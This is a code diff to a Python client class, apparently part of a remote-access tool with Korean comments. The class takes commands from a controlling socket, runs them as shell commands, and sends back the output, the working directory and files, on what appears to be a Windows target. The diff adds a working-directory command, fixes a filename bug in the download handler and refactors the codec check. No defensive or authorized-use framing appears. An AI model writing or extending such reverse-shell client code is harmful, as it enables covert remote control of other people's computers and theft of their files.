@@ -60,10 +60,12 @@ class Client:
                     self.controller.send(str.encode(os.getcwd() + "> "))
                 elif command == ":check":
                     self.controller.send(b":Done:")
-
+                elif command == ":getcwd":
+                    self.controller.send(os.getcwd().encode(self.codec))
                 else:
                     output_str = self.runCMD(command)
                     self.controller.send(bytes(output_str))
+
         return
 
 
@@ -99,7 +101,7 @@ class Client:
                     os.remove(filename)
                     return
                 wf.write(data)
-        self.controller.send(str(os.getcwd()+os.sep+filetodown).encode(self.codec))
+        self.controller.send(str(os.getcwd()+os.sep+filename).encode(self.codec))
 
     def upload(self, command):
         """ 요구하는 파일을 업로드 한다 """
@@ -127,12 +129,7 @@ class Client:
     def get_codec(self):
         """ 해당 터미널 환경의 코텍을 확인&전송 """
         try:
-            cmd = subprocess.Popen("chcp",
-                                   shell=True,
-                                   stdout=subprocess.PIPE,
-                                   stdin=subprocess.PIPE,
-                                   stderr=subprocess.PIPE)
-            output = cmd.stdout.read() + cmd.stderr.read()
+            output = self.runCMD("chcp")
             codec = output.split(b":")[-1].strip().decode("utf-8")
         except:
             codec = "utf-8"
